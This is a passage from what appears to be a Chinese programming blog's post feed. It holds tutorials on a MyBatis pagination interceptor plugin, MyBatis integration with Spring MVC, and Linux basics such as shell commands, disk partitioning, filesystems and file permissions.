org.apache.ibatis.mapping.BoundSql;import org.apache.ibatis.mapping.MappedStatement;import org.apache.ibatis.mapping.ParameterMapping;import org.apache.ibatis.mapping.ParameterMode;import org.apache.ibatis.plugin.Interceptor;import org.apache.ibatis.plugin.Intercepts;import org.apache.ibatis.plugin.Invocation;import org.apache.ibatis.plugin.Plugin;import org.apache.ibatis.plugin.Signature;import org.apache.ibatis.reflection.MetaObject;import org.apache.ibatis.reflection.property.PropertyTokenizer;import org.apache.ibatis.session.Configuration;import org.apache.ibatis.session.ResultHandler;import org.apache.ibatis.session.RowBounds;import org.apache.ibatis.type.TypeHandler;import org.apache.ibatis.type.TypeHandlerRegistry;@Intercepts(&#123; @Signature(type = StatementHandler.class, method = "prepare", args = &#123; Connection.class &#125;) &#125;)public class PagePlugin implements Interceptor &#123; private static String dialect = ""; private static String pageSqlId = ""; @SuppressWarnings("unchecked") public Object intercept(Invocation ivk) throws Throwable &#123; if (ivk.getTarget() instanceof RoutingStatementHandler) &#123; RoutingStatementHandler statementHandler = (RoutingStatementHandler) ivk .getTarget(); BaseStatementHandler delegate = (BaseStatementHandler) ReflectHelper .getValueByFieldName(statementHandler, "delegate"); MappedStatement mappedStatement = (MappedStatement) ReflectHelper .getValueByFieldName(delegate, "mappedStatement"); if (mappedStatement.getId().matches(pageSqlId)) &#123; BoundSql boundSql = delegate.getBoundSql(); Object parameterObject = boundSql.getParameterObject(); if (parameterObject == null) &#123; throw new NullPointerException("parameterObject error"); &#125; else &#123; Connection connection = (Connection) ivk.getArgs()[0]; String sql = boundSql.getSql(); String countSql = "select count(0) from (" + sql + ") myCount"; System.out.println("总数sql 语句:"+countSql); PreparedStatement countStmt = connection .prepareStatement(countSql); BoundSql countBS = new BoundSql( mappedStatement.getConfiguration(), countSql, boundSql.getParameterMappings(), parameterObject); setParameters(countStmt, mappedStatement, countBS, parameterObject); ResultSet rs = countStmt.executeQuery(); int count = 0; if (rs.next()) &#123; count = rs.getInt(1); &#125; rs.close(); countStmt.close(); PageInfo page = null; if (parameterObject instanceof PageInfo) &#123; page = (PageInfo) parameterObject; page.setTotalResult(count); &#125; else if(parameterObject instanceof Map)&#123; Map&lt;String, Object&gt; map = (Map&lt;String, Object&gt;)parameterObject; page = (PageInfo)map.get("page"); if(page == null) page = new PageInfo(); page.setTotalResult(count); &#125;else &#123; Field pageField = ReflectHelper.getFieldByFieldName( parameterObject, "page"); if (pageField != null) &#123; page = (PageInfo) ReflectHelper.getValueByFieldName( parameterObject, "page"); if (page == null) page = new PageInfo(); page.setTotalResult(count); ReflectHelper.setValueByFieldName(parameterObject, "page", page); &#125; else &#123; throw new NoSuchFieldException(parameterObject .getClass().getName()); &#125; &#125; String pageSql = generatePageSql(sql, page); System.out.println("page sql:"+pageSql); ReflectHelper.setValueByFieldName(boundSql, "sql", pageSql); &#125; &#125; &#125; return ivk.proceed(); &#125; private void setParameters(PreparedStatement ps, MappedStatement mappedStatement, BoundSql boundSql, Object parameterObject) throws SQLException &#123; ErrorContext.instance().activity("setting parameters") .object(mappedStatement.getParameterMap().getId()); List&lt;ParameterMapping&gt; parameterMappings = boundSql .getParameterMappings(); if (parameterMappings != null) &#123; Configuration configuration = mappedStatement.getConfiguration(); TypeHandlerRegistry typeHandlerRegistry = configuration .getTypeHandlerRegistry(); MetaObject metaObject = parameterObject == null ? null : configuration.newMetaObject(parameterObject); for (int i = 0; i &lt; parameterMappings.size(); i++) &#123; ParameterMapping parameterMapping = parameterMappings.get(i); if (parameterMapping.getMode() != ParameterMode.OUT) &#123; Object value; String propertyName = parameterMapping.getProperty(); PropertyTokenizer prop = new PropertyTokenizer(propertyName); if (parameterObject == null) &#123; value = null; &#125; else if (typeHandlerRegistry .hasTypeHandler(parameterObject.getClass())) &#123; value = parameterObject; &#125; else if (boundSql.hasAdditionalParameter(propertyName)) &#123; value = boundSql.getAdditionalParameter(propertyName); &#125; else if (propertyName .startsWith(ForEachSqlNode.ITEM_PREFIX) &amp;&amp; boundSql.hasAdditionalParameter(prop.getName())) &#123; value = boundSql.getAdditionalParameter(prop.getName()); if (value != null) &#123; value = configuration.newMetaObject(value) .getValue( propertyName.substring(prop .getName().length())); &#125; &#125; else &#123; value = metaObject == null ? null : metaObject .getValue(propertyName); &#125; TypeHandler typeHandler = parameterMapping.getTypeHandler(); if (typeHandler == null) &#123; throw new ExecutorException( "There was no TypeHandler found for parameter " + propertyName + " of statement " + mappedStatement.getId()); &#125; typeHandler.setParameter(ps, i + 1, value, parameterMapping.getJdbcType()); &#125; &#125; &#125; &#125; private String generatePageSql(String sql, PageInfo page) &#123; if (page != null &amp;&amp; (dialect !=null || !dialect.equals(""))) &#123; StringBuffer pageSql = new StringBuffer(); if ("mysql".equals(dialect)) &#123; pageSql.append(sql); pageSql.append(" limit " + page.getCurrentResult() + "," + page.getShowCount()); &#125; else if ("oracle".equals(dialect)) &#123; pageSql.append("select * from (select tmp_tb.*,ROWNUM row_id from ("); pageSql.append(sql); pageSql.append(") tmp_tb where ROWNUM&lt;="); pageSql.append(page.getCurrentResult() + page.getShowCount()); pageSql.append(") where row_id&gt;"); pageSql.append(page.getCurrentResult()); &#125; return pageSql.toString(); &#125; else &#123; return sql; &#125; &#125; public Object plugin(Object arg0) &#123; // TODO Auto-generated method stub return Plugin.wrap(arg0, this); &#125; public void setProperties(Properties p) &#123; dialect = p.getProperty("dialect"); if (dialect ==null || dialect.equals("")) &#123; try &#123; throw new PropertyException("dialect property is not found!"); &#125; catch (PropertyException e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125; &#125; pageSqlId = p.getProperty("pageSqlId"); if (dialect ==null || dialect.equals("")) &#123; try &#123; throw new PropertyException("pageSqlId property is not found!"); &#125; catch (PropertyException e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125; &#125; &#125;&#125; 此插件有两个辅助类:PageInfo,ReflectHelper,你可以下载源代码参考。 写了插件之后，当然需要在 Mybatis 的配置文件 Configuration.xml 里配置这个插件 123456&lt;plugins&gt; &lt;plugin interceptor="com.yihaomen.util.PagePlugin"&gt; &lt;property name="dialect" value="mysql" /&gt; &lt;property name="pageSqlId" value=".*ListPage.*" /&gt; &lt;/plugin&gt; &lt;/plugins&gt; 请注意，这个插件定义了一个规则，也就是在 mapper 中 sql 语句的 id 必须包含 ListPage 才能被拦截。否则将不会分页处理。 插件写好了，现在就可以在 spring mvc 中的 controller 层中写一个方法来测试这个分页: 1234567891011121314151617181920212223242526272829303132333435363738394041424344@RequestMapping("/pagelist") public ModelAndView pageList(HttpServletRequest request,HttpServletResponse response)&#123; int currentPage = request.getParameter("page")==null?1:Integer.parseInt(request.getParameter("page")); int pageSize = 3; if (currentPage&lt;=0)&#123; currentPage =1; &#125; int currentResult = (currentPage-1) * pageSize; System.out.println(request.getRequestURI()); System.out.println(request.getQueryString()); PageInfo page = new PageInfo(); page.setShowCount(pageSize); page.setCurrentResult(currentResult); List&lt;Article&gt; articles=iUserOperation.selectArticleListPage(page,1); System.out.println(page); int totalCount = page.getTotalResult(); int lastPage=0; if (totalCount % pageSize==0)&#123; lastPage = totalCount % pageSize; &#125; else&#123; lastPage =1+ totalCount / pageSize; &#125; if (currentPage&gt;=lastPage)&#123; currentPage =lastPage; &#125; String pageStr = ""; pageStr=String.format("&lt;a href=\"%s\"&gt;上一页&lt;/a&gt; &lt;a href=\"%s\"&gt;下一页&lt;/a&gt;", request.getRequestURI()+"?page="+(currentPage-1),request.getRequestURI()+"?page="+(currentPage+1) ); //制定视图，也就是list.jsp ModelAndView mav=new ModelAndView("list"); mav.addObject("articles",articles); mav.addObject("pageStr",pageStr); return mav; &#125; 然后运行程序，进入分页页面，你就可以看到结果了:]]></content>
      <categories>
        <category>mybatis</category>
      </categories>
      <tags>
        <tag>ORM框架</tag>
        <tag>分页</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Mybatis与SpringMVC集成]]></title>
    <url>%2F2018%2F03%2F15%2FMybatis%E4%B8%8ESpringMVC%E9%9B%86%E6%88%90%2F</url>
    <content type="text"><![CDATA[Mybatis 与 Spring3 MVC 集成例子前面几篇文章已经讲到了 Mybatis 与 Mpring 的集成。但这个时候，所有的工程还不是 Web 工程，虽然我一直是创建的 Web 工程。今天将直接用 Mybatis与Spring mvc 的方式集成起来，源码在本文结尾处下载。主要有以下几个方面的配置： web.xml 配置 spring dispatchservlet ,比如为:mvc-dispatcher mvc-dispatcher-servlet.xml 文件配置 spring applicationContext.XML文件配置(与数据库相关，与mybatis sqlSessionFaction 整合，扫描所有 mybatis mapper 文件等.) 编写 controller 类 编写页面代码 先有个大概映像，整个工程图如下: 1.web.xml 配置 spring dispatchservlet ,比如为:mvc-dispatcher 1234567891011121314151617181920&lt;context-param&gt; &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt; &lt;param-value&gt;classpath*:config/applicationContext.xml&lt;/param-value&gt; &lt;/context-param&gt; &lt;listener&gt; &lt;listener-class&gt;org.springframework.web.context.ContextLoaderListener&lt;/listener-class&gt; &lt;/listener&gt; &lt;listener&gt; &lt;listener-class&gt; org.springframework.web.context.ContextCleanupListener&lt;/listener-class&gt; &lt;/listener&gt; &lt;servlet&gt; &lt;servlet-name&gt;mvc-dispatcher&lt;/servlet-name&gt; &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt; &lt;load-on-startup&gt;1&lt;/load-on-startup&gt; &lt;/servlet&gt; &lt;servlet-mapping&gt; &lt;servlet-name&gt;mvc-dispatcher&lt;/servlet-name&gt; &lt;url-pattern&gt;/&lt;/url-pattern&gt; &lt;/servlet-mapping&gt; 2.在web.xml 同目录下配置 mvc-dispatcher-servlet.xml 文件,这个文件名前面部分必须与你在 web.xml 里面配置的 DispatcherServlet 的 servlet 名字对应.其内容为: 12345678910111213141516171819202122232425262728&lt;beans xmlns="http://www.springframework.org/schema/beans" xmlns:context="http://www.springframework.org/schema/context" xmlns:mvc="http://www.springframework.org/schema/mvc" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation=" http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-3.0.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context-3.0.xsd http://www.springframework.org/schema/mvc http://www.springframework.org/schema/mvc/spring-mvc-3.0.xsd"&gt; &lt;context:component-scan base-package="com.yihaomen.controller" /&gt; &lt;mvc:annotation-driven /&gt; &lt;mvc:resources mapping="/static/**" location="/WEB-INF/static/"/&gt; &lt;mvc:default-servlet-handler/&gt; &lt;bean class="org.springframework.web.servlet.view.InternalResourceViewResolver"&gt; &lt;property name="prefix"&gt; &lt;value&gt;/WEB-INF/pages/&lt;/value&gt; &lt;/property&gt; &lt;property name="suffix"&gt; &lt;value&gt;.jsp&lt;/value&gt; &lt;/property&gt; &lt;/bean&gt;&lt;/beans&gt; 3.在源码目录 config 目录下配置 spring 配置文件 applicationContext.xml 1234567891011121314151617181920212223242526&lt;!--本示例采用DBCP连接池，应预先把DBCP的jar包复制到工程的lib目录下。 --&gt; &lt;context:property-placeholder location="classpath:/config/database.properties" /&gt; &lt;bean id="dataSource" class="org.apache.commons.dbcp.BasicDataSource" destroy-method="close" p:driverClassName="com.mysql.jdbc.Driver" p:url="jdbc:mysql://127.0.0.1:3306/mybatis?characterEncoding=utf8" p:username="root" p:password="password" p:maxActive="10" p:maxIdle="10"&gt; &lt;/bean&gt; &lt;bean id="transactionManager" class="org.springframework.jdbc.datasource.DataSourceTransactionManager"&gt; &lt;property name="dataSource" ref="dataSource" /&gt; &lt;/bean&gt; &lt;bean id="sqlSessionFactory" class="org.mybatis.spring.SqlSessionFactoryBean"&gt; &lt;!--dataSource属性指定要用到的连接池--&gt; &lt;property name="dataSource" ref="dataSource"/&gt; &lt;!--configLocation属性指定mybatis的核心配置文件--&gt; &lt;property name="configLocation" value="classpath:config/Configuration.xml" /&gt; &lt;!-- 所有配置的mapper文件 --&gt; &lt;property name="mapperLocations" value="classpath*:com/yihaomen/mapper/*.xml" /&gt; &lt;/bean&gt; &lt;bean class="org.mybatis.spring.mapper.MapperScannerConfigurer"&gt; &lt;property name="basePackage" value="com.yihaomen.inter" /&gt; &lt;/bean&gt; 4.编写 controller 层 12345678910111213141516171819202122232425package com.yihaomen.controller;import java.util.List;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.stereotype.Controller;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.servlet.ModelAndView;import com.yihaomen.inter.IUserOperation;import com.yihaomen.model.Article;@Controller@RequestMapping("/article")public class UserController &#123; @Autowired IUserOperation userMapper; @RequestMapping("/list") public ModelAndView listall(HttpServletRequest request,HttpServletResponse response)&#123; List&lt;Article&gt; articles=userMapper.getUserArticles(1); ModelAndView mav=new ModelAndView("list"); mav.addObject("articles",articles); return mav; &#125;&#125; 页面文件: 123&lt;c:forEach items="$&#123;articles&#125;" var="item"&gt; $&#123;item.id &#125;--$&#123;item.title &#125;--$&#123;item.content &#125;&lt;br /&gt; &lt;/c:forEach&gt; 运行结果： 当然还有 mybatis 的Configure.xml 配置文件，与上一讲的差不多，唯一不同的就是不用再配置类似如下的：&lt;mapper resource=&quot;com/yihaomen/mapper/User.xml&quot;/&gt; ，所有这些都交给 在配置 sqlSessionFactory 的时候，由&lt;property name=&quot;mapperLocations&quot; value=&quot;classpath*:com/yihaomen/mapper/*.xml&quot; /&gt;去导入了。]]></content>
      <categories>
        <category>mybatis</category>
      </categories>
      <tags>
        <tag>ORM框架</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux]]></title>
    <url>%2F2018%2F03%2F13%2FLinux%2F</url>
    <content type="text"><![CDATA[一、常用操作以及概念快捷键 Tab：命令和文件名补全； Ctrl+C：中断正在运行的程序； Ctrl+D：结束键盘输入（End Of File，EOF） 求助1. –help指令的基本用法与选项介绍。 2. manman 是 manual 的缩写，将指令的具体信息显示出来。 当执行 man date 时，有 DATE(1) 出现，其中的数字代表指令的类型，常用的数字及其类型如下： 代号 类型 1 用户在 shell 环境中可以操作的指令或者可执行文件 5 配置文件 8 系统管理员可以使用的管理指令 3. infoinfo 与 man 类似，但是 info 将文档分成一个个页面，每个页面可以进行跳转。 4. doc/usr/share/doc 存放着软件的一整套说明文件。 关机1. who在关机前需要先使用 who 命令查看有没有其它用户在线。 2. sync为了加快对磁盘文件的读写速度，位于内存中的文件数据不会立即同步到磁盘上，因此关机之前需要先进行 sync 同步操作。 3. shutdown12345# shutdown [-krhc] 时间 [信息]-k ： 不会关机，只是发送警告信息，通知所有在线的用户-r ： 将系统的服务停掉后就重新启动-h ： 将系统的服务停掉后就立即关机-c ： 取消已经在进行的 shutdown 指令内容 PATH可以在环境变量 PATH 中声明可执行文件的路径，路径之间用 : 分隔。 1/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/home/dmtsai/.local/bin:/home/dmtsai/bin sudosudo 允许一般用户使用 root 可执行的命令，不过只有在 /etc/sudoers 配置文件中添加的用户才能使用该指令。 包管理工具RPM 和 DPKG 为最常见的两类软件包管理工具： RPM 全称为 Redhat Package Manager，最早由 Red Hat 公司制定实施，随后被 GNU 开源操作系统接受并成为很多 Linux 系统 (RHEL) 的既定软件标准。 与 RPM 竞争的是基于 Debian 操作系统 (Ubuntu) 的 DEB 软件包管理工具 DPKG，全称为 Debian Package，功能方面与 RPM 相似。 YUM 基于 RPM，具有依赖管理和软件升级功能。 发行版Linux 发行版是 Linux 内核及各种应用软件的集成版本。 基于的包管理工具 商业发行版 社区发行版 RPM Red Hat Fedora / CentOS DPKG Ubuntu Debian VIM 三个模式 一般指令模式（Command mode）：VIM 的默认模式，可以用于移动游标查看内容； 编辑模式（Insert mode）：按下 “i” 等按键之后进入，可以对文本进行编辑； 指令列模式（Bottom-line mode）：按下 “:” 按键之后进入，用于保存退出等操作。 在指令列模式下，有以下命令用于离开或者保存文件。 命令 作用 :w 写入磁盘 :w! 当文件为只读时，强制写入磁盘。到底能不能写入，与用户对该文件的权限有关 :q 离开 :q! 强制离开不保存 :wq 写入磁盘后离开 :wq! 强制写入磁盘后离开 GNUGNU 计划，译为革奴计划，它的目标是创建一套完全自由的操作系统，称为 GNU，其内容软件完全以 GPL 方式发布。其中 GPL 全称为 GNU 通用公共许可协议，包含了以下内容： 以任何目的运行此程序的自由； 再复制的自由； 改进此程序，并公开发布改进的自由。 开源协议 Choose an open source license 如何选择开源许可证？ 二、磁盘磁盘接口1. IDEIDE（ATA）全称 Advanced Technology Attachment，接口速度最大为 133MB/s，因为并口线的抗干扰性太差，且排线占用空间较大，不利电脑内部散热，已逐渐被 SATA 所取代。 2. SATASATA 全称 Serial ATA，也就是使用串口的 ATA 接口，抗干扰性强，且对数据线的长度要求比 ATA 低很多，支持热插拔等功能。SATA-II 的接口速度为 300MiB/s，而新的 SATA-III 标准可达到 600MiB/s 的传输速度。SATA 的数据线也比 ATA 的细得多，有利于机箱内的空气流通，整理线材也比较方便。 3. SCSISCSI 全称是 Small Computer System Interface（小型机系统接口），经历多代的发展，从早期的 SCSI-II 到目前的 Ultra320 SCSI 以及 Fiber-Channel（光纤通道），接口型式也多种多样。SCSI 硬盘广为工作站以及个人电脑以及服务器所使用，因此会使用较为先进的技术，如碟片转速 15000rpm 的高转速，且传输时 CPU 占用率较低，但是单价也比相同容量的 ATA 及 SATA 硬盘更加昂贵。 4. SASSAS（Serial Attached SCSI）是新一代的 SCSI 技术，和 SATA 硬盘相同，都是采取序列式技术以获得更高的传输速度，可达到 6Gb/s。此外也通过缩小连接线改善系统内部空间等。 磁盘的文件名Linux 中每个硬件都被当做一个文件，包括磁盘。磁盘以磁盘接口类型进行命名，常见磁盘的文件名如下： IDE 磁盘：/dev/hd[a-d] SATA/SCSI/SAS 磁盘：/dev/sd[a-p] 其中文件名后面的序号的确定与系统检测到磁盘的顺序有关，而与磁盘所插入的插槽位置无关。 三、分区分区表磁盘分区表主要有两种格式，一种是限制较多的 MBR 分区表，一种是较新且限制较少的 GPT 分区表。 1. MBRMBR 中，第一个扇区最重要，里面有主要开机记录（Master boot record, MBR）及分区表（partition table），其中主要开机记录占 446 bytes，分区表占 64 bytes。 分区表只有 64 bytes，最多只能存储 4 个分区，这 4 个分区为主分区（Primary）和扩展分区（Extended）。其中扩展分区只有一个，它使用其它扇区来记录额外的分区表，因此通过扩展分区可以分出更多分区，这些分区称为逻辑分区。 Linux 也把分区当成文件，分区文件的命名方式为：磁盘文件名 + 编号，例如 /dev/sda1。注意，逻辑分区的编号从 5 开始。 2. GPT不同的磁盘有不同的扇区大小，例如 512 bytes 和最新磁盘的 4 k。GPT 为了兼容所有磁盘，在定义扇区上使用逻辑区块地址（Logical Block Address, LBA），LBA 默认大小为 512 bytes。 GPT 第 1 个区块记录了主要开机记录（MBR），紧接着是 33 个区块记录分区信息，并把最后的 33 个区块用于对分区信息进行备份。这 33 个区块第一个为 GPT 表头纪录，这个部份纪录了分区表本身的位置与大小和备份分区的位置，同时放置了分区表的校验码 (CRC32)，操作系统可以根据这个校验码来判断 GPT 是否正确。若有错误，可以使用备份分区进行恢复。 GPT 没有扩展分区概念，都是主分区，每个 LBA 可以分 4 个分区，因此总共可以分 4 * 32 = 128 个分区。 MBR 不支持 2.2 TB 以上的硬盘，GPT 则最多支持到 233 TB = 8 ZB。 开机检测程序1. BIOSBIOS（Basic Input/Output System，基本输入输出系统），它是一个固件（嵌入在硬件中的软件），BIOS 程序存放在断电后内容不会丢失的只读内存中。 BIOS 是开机的时候计算机执行的第一个程序，这个程序知道可以开机的磁盘，并读取磁盘第一个扇区的主要开机记录（MBR），由主要开机记录（MBR）执行其中的开机管理程序，这个开机管理程序会加载操作系统的核心文件。 主要开机记录（MBR）中的开机管理程序提供以下功能：选单、载入核心文件以及转交其它开机管理程序。转交这个功能可以用来实现多重引导，只需要将另一个操作系统的开机管理程序安装在其它分区的启动扇区上，在启动开机管理程序时，就可以通过选单选择启动当前的操作系统或者转交给其它开机管理程序从而启动另一个操作系统。 下图中，第一扇区的主要开机记录（MBR）中的开机管理程序提供了两个选单：M1、M2，M1 指向了 Windows 操作系统，而 M2 指向其它分区的启动扇区，里面包含了另外一个开机管理程序，提供了一个指向 Linux 的选单。 安装多重引导，最好先安装 Windows 再安装 Linux。因为安装 Windows 时会覆盖掉主要开机记录（MBR），而 Linux 可以选择将开机管理程序安装在主要开机记录（MBR）或者其它分区的启动扇区，并且可以设置开机管理程序的选单。 2. UEFIBIOS 不可以读取 GPT 分区表，而 UEFI 可以。 四、文件系统分区与文件系统对分区进行格式化是为了在分区上建立文件系统。一个分区通常只能格式化为一个文件系统，但是磁盘阵列等技术可以将一个分区格式化为多个文件系统。 组成最主要的几个组成部分如下： inode：一个文件占用一个 inode，记录文件的属性，同时记录此文件的内容所在的 block 编号； block：记录文件的内容，文件太大时，会占用多个 block。 除此之外还包括： superblock：记录文件系统的整体信息，包括 inode 和 block 的总量、使用量、剩余量，以及文件系统的格式与相关信息等； block bitmap：记录 block 是否被使用的位域。 文件读取对于 Ext2 文件系统，当要读取一个文件的内容时，先在 inode 中去查找文件内容所在的所有 block，然后把所有 block 的内容读出来。 而对于 FAT 文件系统，它没有 inode，每个 block 中存储着下一个 block 的编号。 磁盘碎片指一个文件内容所在的 block 过于分散，导致磁盘磁头移动距离过大，从而降低磁盘读写性能。 block在 Ext2 文件系统中所支持的 block 大小有 1K，2K 及 4K 三种，不同的大小限制了单个文件和文件系统的最大大小。 大小 1KB 2KB 4KB 最大单一文件 16GB 256GB 2TB 最大文件系统 2TB 8TB 16TB 一个 block 只能被一个文件所使用，未使用的部分直接浪费了。因此如果需要存储大量的小文件，那么最好选用比较小的 block。 inodeinode 具体包含以下信息： 权限 (read/write/excute)； 拥有者与群组 (owner/group)； 容量； 建立或状态改变的时间 (ctime)； 最近一次的读取时间 (atime)； 最近修改的时间 (mtime)； 定义文件特性的旗标 (flag)，如 SetUID…； 该文件真正内容的指向 (pointer)。 inode 具有以下特点： 每个 inode 大小均固定为 128 bytes (新的 ext4 与 xfs 可设定到 256 bytes)； 每个文件都仅会占用一个 inode。 inode 中记录了文件内容所在的 block 编号，但是每个 block 非常小，一个大文件随便都需要几十万的 block。而一个 inode 大小有限，无法直接引用这么多 block 编号。因此引入了间接、双间接、三间接引用。间接引用是指，让 inode 记录的引用 block 块记录引用信息。 目录建立一个目录时，会分配一个 inode 与至少一个 block。block 记录的内容是目录下所有文件的 inode 编号以及文件名。 可以看出文件的 inode 本身不记录文件名，文件名记录在目录中，因此新增文件、删除文件、更改文件名这些操作与目录的 w 权限有关。 日志如果突然断电，那么文件系统会发生错误，例如断电前只修改了 block bitmap，而还没有将数据真正写入 block 中。 ext3/ext4 文件系统引入了日志功能，可以利用日志来修复文件系统。 挂载挂载利用目录作为文件系统的进入点，也就是说，进入目录之后就可以读取文件系统的数据。 目录配置为了使不同 Linux 发行版本的目录结构保持一致性，Filesystem Hierarchy Standard (FHS) 规定了 Linux 的目录结构。最基础的三个目录如下： / (root, 根目录) /usr (unix software resource)：所有系统默认软件都会安装到这个目录； /var (variable)：存放系统或程序运行过程中的数据文件。 五、文件文件属性用户分为三种：文件拥有者、群组以及其它人，对不同的用户有不同的文件权限。 使用 ls 查看一个文件时，会显示一个文件的信息，例如 drwxr-xr-x 3 root root 17 May 6 00:14 .config，对这个信息的解释如下： drwxr-xr-x：文件类型以及权限，第 1 位为文件类型字段，后 9 位为文件权限字段 3：链接数 root：文件拥有者 root：所属群组 17：文件大小 May 6 00:14：文件最后被修改的时间 .config：文件名 常见的文件类型及其含义有： d：目录 -：文件 l：链接文件 9 位的文件权限字段中，每 3 个为一组，共 3 组，每一组分别代表对文件拥有者、所属群组以及其它人的文件权限。一组权限中的 3 位分别为 r、w、x 权限，表示可读、可写、可执行。 文件时间有以下三种： modification time (mtime)：文件的内容更新就会更新； status time (ctime)：文件的状态（权限、属性）更新就会更新； access time (atime)：读取文件时就会更新。 文件与目录的基本操作1. ls列出文件或者目录的信息，目录的信息就是其中包含的文件。 1234# ls [-aAdfFhilnrRSt] file|dir-a ：列出全部的文件-d ：仅列出目录本身-l ：以长数据串行列出，包含文件的属性与权限等等数据 2. cd更换当前目录。 1cd [相对路径或绝对路径] 3. mkdir创建目录。 123# mkdir [-mp] 目录名称-m ：配置目录权限-p ：递归创建目录 4. rmdir删除目录，目录必须为空。 12rmdir [-p] 目录名称-p ：递归删除目录 5. touch更新文件时间或者建立新文件。 123456# touch [-acdmt] filename-a ： 更新 atime-c ： 更新 ctime，若该文件不存在则不建立新文件-m ： 更新 mtime-d ： 后面可以接更新日期而不使用当前日期，也可以使用 --date="日期或时间"-t ： 后面可以接更新时间而不使用当前时间，格式为[YYYYMMDDhhmm] 6. cp复制文件。 如果源文件有两个以上，则目的文件一定要是目录才行。 12345678cp [-adfilprsu] source destination-a ：相当于 -dr --preserve=all 的意思，至于 dr 请参考下列说明-d ：若来源文件为链接文件，则复制链接文件属性而非文件本身-i ：若目标文件已经存在时，在覆盖前会先询问-p ：连同文件的属性一起复制过去-r ：递归持续复制-u ：destination 比 source 旧才更新 destination，或 destination 不存在的情况下才复制--preserve=all ：除了 -p 的权限相关参数外，还加入 SELinux 的属性, links, xattr 等也复制了 7. rm删除文件。 12# rm [-fir] 文件或目录-r ：递归删除 8. mv移动文件。 123# mv [-fiu] source destination# mv [options] source1 source2 source3 .... directory-f ： force 强制的意思，如果目标文件已经存在，不会询问而直接覆盖 修改权限可以将一组权限用数字来表示，此时一组权限的 3 个位当做二进制数字的位，从左到右每个位的权值为 4、2、1，即每个权限对应的数字权值为 r : 4、w : 2、x : 1。 1# chmod [-R] xyz dirname/filename 示例：将 .bashrc 文件的权限修改为 -rwxr-xr–。 1# chmod 754 .bashrc 也可以使用符号来设定权限。 12345678# chmod [ugoa] [+-=] [rwx] dirname/filename- u：拥有者- g：所属群组- o：其他人- a：所有人- +：添加权限- -：移除权限- =：设定权限 示例：为 .bashrc 文件的所有用户添加写权限。 1# chmod a+w .bashrc 文件默认权限 文件默认权限：文件默认没有可执行权限，因此为 666，也就是 -rw-rw-rw- 。 目录默认权限：目录必须要能够进入，也就是必须拥有可执行权限，因此为 777 ，也就是 drwxrwxrwx。 可以通过 umask 设置或者查看文件的默认权限，通常以掩码的形式来表示，例如 002 表示其它用户的权限去除了一个 2 的权限，也就是写权限，因此建立新文件时默认的权限为 -rw-rw-r–。 目录的权限文件名不是存储在一个文件的内容中，而是存储在一个文件所在的目录中。因此，拥有文件的 w 权限并不能对文件名进行修改。 目录存储文件列表，一个目录的权限也就是对其文件列表的权限。因此，目录的 r 权限表示可以读取文件列表；w 权限表示可以修改文件列表，具体来说，就是添加删除文件，对文件名进行修改；x 权限可以让该目录成为工作目录，x 权限是 r 和 w 权限的基础，如果不能使一个目录成为工作目录，也就没办法读取文件列表以及对文件列表进行修改了。 链接123# ln [-sf] source_filename dist_filename-s ：默认是 hard link，加 -s 为 symbolic link-f ：如果目标文件存在时，先删除目标文件 1. 实体链接在目录下创建一个条目，记录着文件名与 inode 编号，这个 inode 就是源文件的 inode。 删除任意一个条目，文件还是存在，只要引用数量不为 0。 有以下限制：不能跨越文件系统、不能对目录进行链接。 1234# ln /etc/crontab .# ll -i /etc/crontab crontab34474855 -rw-r--r--. 2 root root 451 Jun 10 2014 crontab34474855 -rw-r--r--. 2 root root 451 Jun 10 2014 /etc/crontab 2. 符号链接符号链接文件保存着源文件所在的绝对路径，在读取时会定位到源文件上，可以理解为 Windows 的快捷方式。 当源文件被删除了，链接文件就打不开了。 可以为目录建立链接。 123# ll -i /etc/crontab /root/crontab234474855 -rw-r--r--. 2 root root 451 Jun 10 2014 /etc/crontab53745909 lrwxrwxrwx. 1 root root 12 Jun 23 22:31 /root/crontab2 -&gt; /etc/crontab 获取文件内容1. cat取得文件内容。 12# cat [-AbEnTv] filename-n ：打印出行号，连同空白行也会有行号，-b 不会 2. tac是 cat 的反向操作，从最后一行开始打印。 3. more和 cat 不同的是它可以一页一页查看文件内容，比较适合大文件的查看。 4. less和 more 类似，但是多了一个向前翻页的功能。 5. head取得文件前几行。 12# head [-n number] filename-n ：后面接数字，代表显示几行的意思 6. tail是 head 的反向操作，只是取得是后几行。 7. od以字符或者十六进制的形式显示二进制文件。 指令与文件搜索1. which指令搜索。 12# which [-a] command-a ：将所有指令列出，而不是只列第一个 2. whereis文件搜索。速度比较快，因为它只搜索几个特定的目录。 1# whereis [-bmsu] dirname/filename 3. locate文件搜索。可以用关键字或者正则表达式进行搜索。 locate 使用 /var/lib/mlocate/ 这个数据库来进行搜索，它存储在内存中，并且每天更新一次，所以无法用 locate 搜索新建的文件。可以使用 updatedb 来立即更新数据库。 12# locate [-ir] keyword-r：正则表达式 4. find文件搜索。可以使用文件的属性和权限进行搜索。 12# find [basedir] [option]example: find . -name "shadow*" ① 与时间有关的选项 1234-mtime n ：列出在 n 天前的那一天修改过内容的文件-mtime +n ：列出在 n 天之前 (不含 n 天本身) 修改过内容的文件-mtime -n ：列出在 n 天之内 (含 n 天本身) 修改过内容的文件-newer file ： 列出比 file 更新的文件 +4、4 和 -4 的指示的时间范围如下： ② 与文件拥有者和所属群组有关的选项 123456-uid n-gid n-user name-group name-nouser ：搜索拥有者不存在 /etc/passwd 的文件-nogroup：搜索所属群组不存在于 /etc/group 的文件 ③ 与文件权限和名称有关的选项 123456-name filename-size [+-]SIZE：搜寻比 SIZE 还要大 (+) 或小 (-) 的文件。这个 SIZE 的规格有：c: 代表 byte，k: 代表 1024bytes。所以，要找比 50KB 还要大的文件，就是 -size +50k-type TYPE-perm mode ：搜索权限等于 mode 的文件-perm -mode 